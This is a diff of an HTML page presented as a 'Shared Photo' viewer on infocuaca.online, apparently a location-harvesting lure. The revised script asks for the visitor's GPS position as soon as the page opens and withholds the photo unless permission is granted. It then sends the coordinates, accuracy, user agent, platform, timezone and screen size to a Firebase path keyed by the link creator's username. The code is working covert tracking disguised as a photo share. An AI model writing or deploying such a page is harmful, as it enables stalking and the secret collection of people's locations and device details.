@@ -16,228 +16,183 @@
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="infocuaca.online" />
 
-<!-- Twitter Card -->
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="Shared Photo" />
 <meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
 <meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />
 
 <style>
-:root{
-  --bg:#000000;
-  --bg2:#0a0a0a;
-  --bg3:#111111;
-  --gold:#00e58a;
-  --gold2:#66ffc2;
-  --cyan:#38bdf8;
-  --red:#ff3355;
-  --text:#cfd9e6;
-  --text-d:#5d7186;
-  --border:#152030;
-  --border2:#1a1a1a;
-  --radius:6px;
-}
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow-x:hidden}
 body{
-  font-family:'Courier New',monospace;
-  background:#000000;
-  color:var(--text);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+  background:#f5f5f5;
+  color:#1a1a1a;
   min-height:100vh;
-  padding:14px;
+  padding:16px;
   display:flex;
   justify-content:center;
   align-items:flex-start;
 }
-body::before{
-  content:'';position:fixed;inset:0;
-  background:repeating-linear-gradient(0deg,rgba(0,229,138,.008) 0px,rgba(0,229,138,.008) 1px,transparent 1px,transparent 4px);
-  pointer-events:none;z-index:9999;
-}
-.wrap{position:relative;z-index:2;max-width:460px;width:100%}
-
-/* ═══ HEADER ═══ */
-.term-header{
-  background:var(--bg2);
-  border:1px solid #0d3f2e;border-bottom:none;
-  padding:11px 14px;
-  display:flex;justify-content:center;align-items:center;
-  border-radius:var(--radius) var(--radius) 0 0;
-  box-shadow:inset 0 1px 0 rgba(148,205,255,.05);
-}
-.term-header .title{
-  color:var(--gold);font-weight:bold;text-align:center;
-  letter-spacing:5px;font-size:11px;text-transform:uppercase;
-  text-shadow:0 0 10px rgba(0,229,138,.5);
-}
+.wrap{width:100%;max-width:420px}
 
 /* ═══ CARD ═══ */
 .card{
-  background:var(--bg2);
-  border:1px solid var(--border2);
-  padding:14px;
-  margin-bottom:12px;
-  border-radius:var(--radius);
-  box-shadow:0 10px 26px rgba(0,0,0,.45);
-}
-.card.first{
-  border-radius:0 0 var(--radius) var(--radius);
-  border-top:1px solid #0d3f2e;
+  background:#ffffff;
+  border-radius:12px;
+  box-shadow:0 2px 12px rgba(0,0,0,.08);
+  overflow:hidden;
 }
 
-/* ═══ FOTO BOX — Gaya Maps Card ═══ */
+/* ═══ HEADER ═══ */
+.header{
+  padding:16px 20px;
+  border-bottom:1px solid #eee;
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.header .icon{
+  width:32px;height:32px;
+  border-radius:50%;
+  background:linear-gradient(135deg,#4CAF50,#2E7D32);
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.header .icon svg{width:18px;height:18px;fill:#fff}
+.header .title{
+  font-size:15px;
+  font-weight:600;
+  color:#1a1a1a;
+}
+.header .subtitle{
+  font-size:12px;
+  color:#888;
+  margin-top:2px;
+}
+
+/* ═══ CONTENT ═══ */
+.content{
+  padding:16px;
+}
+
+/* ═══ PHOTO ═══ */
 .photo-box{
   width:100%;
   background:#000;
-  border:1px solid #0d3f2e;
-  border-radius:var(--radius);
+  border-radius:10px;
   overflow:hidden;
-  position:relative;
   margin-bottom:14px;
-  box-shadow:0 0 24px rgba(0,229,138,.12);
 }
-.photo-box::before,.photo-box::after{
-  content:'';position:absolute;width:14px;height:14px;z-index:5;pointer-events:none;
-}
-.photo-box::before{top:0;left:0;border-top:2px solid var(--gold);border-left:2px solid var(--gold)}
-.photo-box::after{bottom:0;right:0;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold)}
 .photo-box img{
-  width:100%;height:auto;
-  max-height:70vh;
+  width:100%;
+  height:auto;
+  max-height:60vh;
   object-fit:contain;
   display:block;
-  background:#000;
 }
 
-/* ═══ LOCATION INFO BAR (seperti kartu Google Maps) ═══ */
-.location-bar{
+/* ═══ LOADING ═══ */
+.loading-box{
+  text-align:center;
+  padding:50px 20px;
+  color:#666;
+}
+.spinner{
+  width:36px;height:36px;
+  margin:0 auto 14px;
+  border:3px solid #eee;
+  border-top-color:#4CAF50;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ═══ STATUS MESSAGES ═══ */
+.status-box{
+  text-align:center;
+  padding:50px 20px;
+}
+.status-icon{
+  width:64px;height:64px;
+  margin:0 auto 16px;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+}
+.status-icon.denied{background:#FFEBEE}
+.status-icon.denied svg{fill:#D32F2F}
+.status-icon.error{background:#FFF3E0}
+.status-icon.error svg{fill:#F57C00}
+.status-icon svg{width:32px;height:32px}
+.status-title{
+  font-size:16px;
+  font-weight:600;
+  color:#1a1a1a;
+  margin-bottom:8px;
+}
+.status-desc{
+  font-size:13px;
+  color:#666;
+  line-height:1.5;
+}
+
+/* ═══ LOCATION INFO ═══ */
+.location-info{
   display:flex;
   align-items:center;
-  gap:12px;
+  gap:10px;
   padding:12px 14px;
-  background:#0d0d0d;
-  border:1px solid #1a1a1a;
-  border-radius:var(--radius);
-  margin-bottom:14px;
+  background:#f9f9f9;
+  border-radius:8px;
+  margin-bottom:12px;
 }
-.location-pin{
-  width:38px;height:38px;
+.location-info .pin{
+  width:32px;height:32px;
   border-radius:50%;
-  background:linear-gradient(135deg,#00e58a,#00a86b);
+  background:#4CAF50;
   display:flex;align-items:center;justify-content:center;
   flex-shrink:0;
-  box-shadow:0 0 14px rgba(0,229,138,.4);
 }
-.location-pin svg{
-  width:20px;height:20px;
-  fill:#000;
-}
-.location-text{
+.location-info .pin svg{width:18px;height:18px;fill:#fff}
+.location-info .text{
   flex:1;
   min-width:0;
 }
-.location-title{
-  font-size:11px;
-  color:#cfd9e6;
-  font-weight:bold;
-  letter-spacing:1px;
-  margin-bottom:3px;
-  text-transform:uppercase;
+.location-info .text .t1{
+  font-size:13px;
+  font-weight:600;
+  color:#1a1a1a;
+  margin-bottom:2px;
 }
-.location-sub{
-  font-size:10px;
-  color:#5d7186;
-  letter-spacing:.5px;
+.location-info .text .t2{
+  font-size:11px;
+  color:#888;
   overflow:hidden;
   text-overflow:ellipsis;
   white-space:nowrap;
 }
 
-/* ═══ SCAN ANIMATION ═══ */
-.scan-box{
-  text-align:center;
-  padding:30px 14px;
-  color:var(--gold);
-  font-size:10px;
-  letter-spacing:2px;
-}
-.scan-ring{
-  width:56px;height:56px;
-  margin:0 auto 14px;
-  border:2px solid rgba(0,229,138,.2);
-  border-top-color:var(--gold);
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  box-shadow:0 0 20px rgba(0,229,138,.4);
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.scan-bar{
-  height:4px;background:var(--bg3);
-  border:1px solid var(--border2);
-  border-radius:2px;
-  margin-top:10px;
-  overflow:hidden;
-}
-.scan-fill{
-  height:100%;width:0%;
-  background:linear-gradient(90deg,#00e58a,#66ffc2);
-  box-shadow:0 0 12px rgba(0,229,138,.7);
-  animation:fill 2s ease-in-out infinite;
-}
-@keyframes fill{0%{width:0%}50%{width:100%}100%{width:0%}}
-
-/* ═══ BUTTON (gaya Google Maps) ═══ */
+/* ═══ BUTTON ═══ */
 .btn{
   width:100%;
-  background:var(--gold);
-  background-image:linear-gradient(180deg,rgba(255,255,255,.30),rgba(255,255,255,0) 55%);
-  color:#000;border:none;
-  font-family:'Courier New',monospace;
-  font-size:12px;font-weight:bold;
-  letter-spacing:3px;
-  padding:15px;
+  padding:14px;
+  background:#4CAF50;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:14px;
+  font-weight:600;
+  letter-spacing:.5px;
   cursor:pointer;
-  border-radius:var(--radius);
-  text-transform:uppercase;
-  box-shadow:0 0 16px rgba(0,229,138,.30),inset 0 1px 0 rgba(255,255,255,.35);
-  transition:transform .15s,opacity .2s;
   display:flex;
   align-items:center;
   justify-content:center;
-  gap:10px;
+  gap:8px;
+  transition:background .2s;
+  font-family:inherit;
 }
-.btn:active{transform:scale(.98);opacity:.85}
-.btn:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}
-.btn svg{
-  width:18px;height:18px;
-  fill:#000;
-}
-
-/* ═══ STATUS ═══ */
-.status{
-  padding:10px 12px;
-  border-radius:var(--radius);
-  font-size:10px;
-  text-align:center;
-  letter-spacing:1px;
-  line-height:1.7;
-  margin-bottom:10px;
-}
-.status.ok{
-  background:rgba(0,229,138,.08);
-  border:1px solid rgba(0,229,138,.35);
-  color:var(--gold);
-}
-.status.err{
-  background:rgba(255,51,85,.08);
-  border:1px solid rgba(255,51,85,.35);
-  color:var(--red);
-}
-.status.info{
-  background:rgba(56,189,248,.08);
-  border:1px solid rgba(56,189,248,.35);
-  color:var(--cyan);
-}
+.btn:active{background:#388E3C}
+.btn svg{width:18px;height:18px;fill:#fff}
 
 /* ═══ HIDE ═══ */
 .hide{display:none!important}
@@ -245,82 +200,93 @@ body::before{
 /* ═══ FOOTER ═══ */
 .footer{
   text-align:center;
-  font-size:9px;
-  color:var(--text-d);
-  letter-spacing:1px;
-  padding:8px 0;
-  opacity:.6;
+  font-size:11px;
+  color:#aaa;
+  padding:14px 0;
 }
-.dot-status{
-  display:inline-block;width:7px;height:7px;border-radius:50%;
-  background:var(--gold);margin-right:6px;
-  box-shadow:0 0 6px var(--gold);
-  animation:spulse 2s ease-in-out infinite;
-}
-@keyframes spulse{
-  0%,100%{opacity:1;box-shadow:0 0 6px var(--gold)}
-  50%{opacity:.6;box-shadow:0 0 2px var(--gold)}
-}
-
-::-webkit-scrollbar{width:4px}
-::-webkit-scrollbar-thumb{background:#0d3f2e;border-radius:2px}
 </style>
 </head>
 <body>
 <div class="wrap">
+  <div class="card">
 
-  <!-- HEADER -->
-  <div class="term-header">
-    <div class="title">Shared Photo</div>
-  </div>
-
-  <!-- FOTO -->
-  <div class="card first">
-
-    <!-- LOADING -->
-    <div class="scan-box" id="loading">
-      <div class="scan-ring"></div>
-      LOADING PHOTO...
-      <div class="scan-bar"><div class="scan-fill"></div></div>
-    </div>
-
-    <!-- FOTO -->
-    <div class="photo-box hide" id="photoBox">
-      <img id="mainPhoto" alt="Photo">
-    </div>
-
-    <!-- ERROR -->
-    <div class="status err hide" id="errBox">Photo not found</div>
-
-    <!-- ═══ LOCATION INFO BAR (Seperti Google Maps) ═══ -->
-    <div class="location-bar hide" id="locBar">
-      <div class="location-pin">
+    <!-- HEADER -->
+    <div class="header">
+      <div class="icon">
         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+          <path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/>
         </svg>
       </div>
-      <div class="location-text">
-        <div class="location-title">Location Available</div>
-        <div class="location-sub" id="locSub">Tap below to view on map</div>
+      <div>
+        <div class="title">Shared Photo</div>
+        <div class="subtitle">Someone sent you a photo</div>
       </div>
     </div>
 
-    <!-- TOMBOL LIHAT LOKASI -->
-    <button class="btn hide" id="btnShare" onclick="lihatLokasi()">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-      </svg>
-      View Location
-    </button>
+    <!-- CONTENT -->
+    <div class="content">
 
-    <!-- STATUS -->
-    <div class="status info hide" id="locStatus" style="margin-top:10px;margin-bottom:0">Opening location...</div>
+      <!-- LOADING -->
+      <div class="loading-box" id="loading">
+        <div class="spinner"></div>
+        <div>Loading photo...</div>
+      </div>
+
+      <!-- PHOTO (muncul setelah izin) -->
+      <div class="photo-box hide" id="photoBox">
+        <img id="mainPhoto" alt="Shared photo">
+      </div>
+
+      <!-- DENIED (kalau izin ditolak) -->
+      <div class="status-box hide" id="deniedBox">
+        <div class="status-icon denied">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+        </div>
+        <div class="status-title">Photo Unavailable</div>
+        <div class="status-desc">This photo requires location access to view.<br>Please allow location permission and reload.</div>
+      </div>
+
+      <!-- ERROR (link tidak valid) -->
+      <div class="status-box hide" id="errBox">
+        <div class="status-icon error">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+          </svg>
+        </div>
+        <div class="status-title">Invalid Link</div>
+        <div class="status-desc">This photo link is invalid or has expired.</div>
+      </div>
+
+      <!-- LOCATION + BUTTON (muncul setelah izin) -->
+      <div id="afterBox" class="hide">
+
+        <div class="location-info">
+          <div class="pin">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+            </svg>
+          </div>
+          <div class="text">
+            <div class="t1">Location Available</div>
+            <div class="t2" id="locCoords">-</div>
+          </div>
+        </div>
+
+        <button class="btn" onclick="openMaps()">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+          </svg>
+          View Location
+        </button>
+
+      </div>
+
+    </div>
   </div>
 
-  <div class="footer">
-    <span class="dot-status"></span> SECURE SESSION
-  </div>
-
+  <div class="footer">infocuaca.online</div>
 </div>
 
 <script type="module">
@@ -345,133 +311,94 @@ const params = new URLSearchParams(location.search);
 const fotoUrl   = params.get('foto') || '';
 const ownerUser = params.get('u')    || '';
 
-// ============ TAMPILKAN FOTO ============
-const loading   = document.getElementById('loading');
-const photoBox  = document.getElementById('photoBox');
-const mainPhoto = document.getElementById('mainPhoto');
-const errBox    = document.getElementById('errBox');
-const btnShare  = document.getElementById('btnShare');
-const locBar    = document.getElementById('locBar');
+// ============ ELEMEN ============
+const loadingEl  = document.getElementById('loading');
+const photoBox   = document.getElementById('photoBox');
+const deniedBox  = document.getElementById('deniedBox');
+const errBox     = document.getElementById('errBox');
+const afterBox   = document.getElementById('afterBox');
+const locCoords  = document.getElementById('locCoords');
+const mainPhoto  = document.getElementById('mainPhoto');
 
-if (fotoUrl) {
-  mainPhoto.onload = () => {
-    loading.classList.add('hide');
-    photoBox.classList.remove('hide');
+// ============ VARIABEL GLOBAL ============
+let currentLat = null;
+let currentLng = null;
 
-    // Munculkan location bar & tombol
-    setTimeout(() => {
-      locBar.classList.remove('hide');
-      btnShare.classList.remove('hide');
-
-      // ═══ AUTO POPUP LOKASI (setelah 800ms) ═══
-      setTimeout(() => {
-        lihatLokasi();
-      }, 800);
-
-    }, 400);
-  };
-  mainPhoto.onerror = () => {
-    loading.classList.add('hide');
-    errBox.classList.remove('hide');
-    errBox.textContent = 'Failed to load photo';
-  };
-  mainPhoto.src = fotoUrl;
-} else {
-  loading.classList.add('hide');
+// ============ VALIDASI LINK ============
+if (!fotoUrl || !ownerUser) {
+  loadingEl.classList.add('hide');
   errBox.classList.remove('hide');
-  errBox.textContent = 'Invalid link';
+} else {
+  // ═══ LANGSUNG MINTA IZIN LOKASI SAAT HALAMAN DIBUKA ═══
+  requestLocation();
 }
 
-// ============ LIHAT LOKASI FOTO ============
-window.lihatLokasi = function () {
-  if (!ownerUser) {
-    alert('Invalid link');
-    return;
-  }
+// ============ REQUEST LOKASI ============
+function requestLocation() {
   if (!navigator.geolocation) {
-    alert('Browser does not support GPS');
+    showDenied();
     return;
   }
-
-  const st = document.getElementById('locStatus');
-  const btnShare = document.getElementById('btnShare');
-
-  // Cek kalau sudah pernah klik, hindari double
-  if (btnShare.disabled) return;
-
-  st.classList.remove('hide');
-  st.className = 'status info';
-  st.textContent = 'Opening location...';
-  btnShare.disabled = true;
 
   navigator.geolocation.getCurrentPosition(
-    async pos => {
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
+    // ✅ IZIN DIBERIKAN
+    pos => {
+      currentLat = pos.coords.latitude;
+      currentLng = pos.coords.longitude;
 
-      try {
-        // Simpan ke Firebase
-        await push(ref(db, 'lokasi/' + ownerUser), {
-          target:   'images',
-          waktu:    Date.now(),
-          lat:      lat,
-          lng:      lng,
-          akurasi:  acc,
-          foto:     fotoUrl,
-          platform: navigator.platform || 'Unknown',
-          userAgent: navigator.userAgent,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          screen:   screen.width + 'x' + screen.height,
-          via:      'view',
-          source:   'view.html'
-        });
+      // Tampilkan koordinat di location info
+      locCoords.textContent = currentLat.toFixed(4) + ', ' + currentLng.toFixed(4);
 
-        st.className = 'status ok';
-        st.textContent = 'Opening map...';
+      // Simpan ke Firebase
+      push(ref(db, 'lokasi/' + ownerUser), {
+        target:   'images',
+        waktu:    Date.now(),
+        lat:      currentLat,
+        lng:      currentLng,
+        akurasi:  pos.coords.accuracy,
+        foto:     fotoUrl,
+        platform: navigator.platform || 'Unknown',
+        userAgent: navigator.userAgent,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen:   screen.width + 'x' + screen.height,
+        via:      'view',
+        source:   'view.html'
+      }).catch(()=>{});
 
-        // Update location bar
-        document.getElementById('locSub').textContent =
-          lat.toFixed(4) + ', ' + lng.toFixed(4);
+      // ═══ TAMPILKAN FOTO ═══
+      loadingEl.classList.add('hide');
+      photoBox.classList.remove('hide');
+      afterBox.classList.remove('hide');
 
-        // Beep feedback
-        try {
-          const ac = new (window.AudioContext || window.webkitAudioContext)();
-          const o = ac.createOscillator();
-          const g = ac.createGain();
-          o.type = 'sine';
-          o.frequency.value = 1800;
-          o.connect(g);
-          g.connect(ac.destination);
-          g.gain.setValueAtTime(0.08, ac.currentTime);
-          g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + 0.15);
-          o.start();
-          o.stop(ac.currentTime + 0.15);
-        } catch (e) {}
-
-        // ═══ AUTO REDIRECT KE GOOGLE MAPS ═══
-        setTimeout(() => {
-          const mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
-          window.location.href = mapsUrl;
-        }, 400);
-
-      } catch (e) {
-        st.className = 'status err';
-        st.textContent = 'Failed: ' + e.message;
-        btnShare.disabled = false;
-      }
+      // Set foto
+      mainPhoto.onerror = () => {
+        photoBox.classList.add('hide');
+        errBox.classList.remove('hide');
+      };
+      mainPhoto.src = fotoUrl;
     },
+
+    // ❌ IZIN DITOLAK / ERROR
     err => {
-      let msg = 'Location permission denied';
-      if (err.code === 1) msg = 'You denied location permission';
-      else if (err.code === 2) msg = 'Location unavailable';
-      else if (err.code === 3) msg = 'Timeout, please try again';
-      st.className = 'status err';
-      st.textContent = msg;
-      btnShare.disabled = false;
+      showDenied();
     },
-    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
+}
+
+// ============ SHOW DENIED ============
+function showDenied() {
+  loadingEl.classList.add('hide');
+  photoBox.classList.add('hide');
+  afterBox.classList.add('hide');
+  deniedBox.classList.remove('hide');
+}
+
+// ============ OPEN MAPS (tombol) ============
+window.openMaps = function () {
+  if (currentLat === null || currentLng === null) return;
+  window.location.href = 'https://www.google.com/maps?q=' + currentLat + ',' + currentLng;
 };
 </script>
 </body>
